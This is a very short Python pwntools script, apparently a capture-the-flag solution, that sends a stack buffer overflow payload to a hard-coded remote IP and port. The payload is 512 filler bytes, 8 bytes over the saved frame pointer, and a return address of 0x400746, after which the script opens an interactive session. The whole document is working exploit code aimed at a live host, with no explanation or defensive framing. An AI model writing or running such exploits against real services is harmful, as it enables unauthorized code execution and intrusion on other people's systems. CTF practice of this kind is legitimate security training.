from pwn import *

p = b'a' * 512 + b'b'*8 + p64(0x400746)


r = remote('34.76.206.46',10002)
r.send(p)

r.interactive()
